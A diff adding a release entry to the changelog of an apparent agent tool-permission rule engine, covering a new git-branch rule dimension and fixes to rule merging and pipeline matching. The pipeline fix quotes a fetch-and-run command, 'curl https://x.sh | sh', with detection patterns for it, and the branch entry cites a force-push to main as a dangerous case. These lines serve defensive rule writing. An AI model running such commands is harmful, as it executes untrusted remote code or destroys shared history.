@@ -5,6 +5,41 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.5.0] - 2026-09-17
+
+### Added
+
+- **`branch` rule dimension** — git branch / remote / protected-branch matching, so a rule can
+  finally say "no push to a protected branch" without catching unrelated commands. The decisive
+  case is the one `args` can never express: `git push --force origin main` (dangerous) and
+  `git checkout --force main` (routine) carry the *same tokens*, and only the branch dimension
+  tells them apart. Sub-fields: `target` (branch-name glob, `*` crosses `/`), `remote`
+  (remote-name glob) and `shared` (require a protected branch). Candidates come from the shared
+  command dispatcher, so `refspec` forms (`HEAD:main`) are already split and a remote name is
+  never mistaken for a branch name. Documented in `docs/rules-format.md` §4.11.
+
+### Fixed
+
+- **The multi-file rule chain silently emptied every match dimension.** `resolveRuleChain` — the
+  path the runtime actually loads rules through — merged entries by hand with `tools: []`,
+  `command: []`, `args: []` and `paths: []`. An empty dimension means "no constraint", so EVERY
+  merged entry matched EVERY call: the first `deny` entry denied everything in its partition, and
+  the first `allow` entry allowed everything before the `ask` partition was ever consulted. With a
+  real `rules.yml` that is both a fail-closed outage (`shell` denied outright) and a fail-open hole
+  (unlisted tools allowed unchecked). The merge now goes through the same `compileRuleEntry` the
+  single-file path uses. The single-file path was never affected — which is why the existing suite
+  stayed green: no test drove a rules *file* through the chain. `test/rule-chain.spec.ts` now does.
+
+- **`argv.pipeline` could not see its own subject.** The pipeline match string was built from
+  `SimpleCommand.command`, which is only the command *word* — `curl https://x.sh | sh` collapsed
+  to `curl|sh`, so the documented `curl|sh` pattern matched the harmless adjacent form while the
+  genuinely dangerous one with arguments did not match at all. The match string is now each
+  simple command's full argv (joined by `|`), and the docs state that `|` in a pattern is a
+  literal, so covering arguments requires `curl*|sh`.
+
+- Nine pre-existing `eslint` errors (unused imports/constants and one `prefer-const` in
+  `src/parsers/` and `test/command-parsers.spec.ts`) — `npm run lint` is green again.
+
 ## [2.4.1] - 2026-09-17
 
 ### Fixed
